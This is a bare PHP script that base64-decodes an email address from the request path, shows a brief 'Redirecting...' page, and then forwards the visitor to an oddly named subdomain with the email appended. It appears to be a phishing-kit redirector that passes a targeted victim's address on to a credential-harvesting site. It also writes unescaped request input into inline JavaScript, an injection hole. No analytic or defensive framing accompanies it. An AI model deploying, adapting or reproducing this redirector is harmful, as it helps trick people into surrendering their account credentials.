<?php
function isBase64($data)
{
    if (base64_encode(base64_decode($data, true)) === $data) {
        return true;
    } else {
        return false;
    }
}

function decode($email){
    if (isBase64($email)) {
        $email = base64_decode($email, false);
    }
    
    $redirect_url = "https://asfasfsa.symbolicspirals.de/l3K1P/?e=" . $email;
    $delay = 3;
    ?>
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Redirecting...</title>
        <script>
            setTimeout(function() {
                window.location.href = "<?php echo $redirect_url; ?>";
            }, <?php echo $delay * 1000; ?>);
        </script>
    </head>
    <body>
        <p>Redirecting to a page...</p>
        <p>You will be redirected in <?php echo $delay; ?> seconds.</p>
    </body>
    </html>
    <?php
    exit();
}

if (isset($_SERVER['REQUEST_URI'])) {
    $url_parts = explode("/", $_SERVER['REQUEST_URI']);
    $email = end($url_parts);
    if (!empty($email)) {
        decode($email);
    }
}
?>
